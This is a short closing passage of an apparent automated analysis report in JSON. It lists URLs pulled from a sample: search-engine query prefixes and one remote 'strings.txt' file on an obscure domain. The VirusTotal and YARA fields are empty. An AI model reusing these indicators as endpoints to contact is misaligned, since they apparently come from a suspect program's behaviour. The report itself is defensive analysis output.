            "http://suche.fireball.de/cgi-bin/pursuit?pag=av&query=",
            "http://it.ask.com/web?q=",
            "http://www.xshqiptaretx.org/strings.txt",
            "http://www.baidu.com/s?lm=0&si=&rn=50&wd=",
            "http://"
        ]
    },
    "time": "0:00:00.630622",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
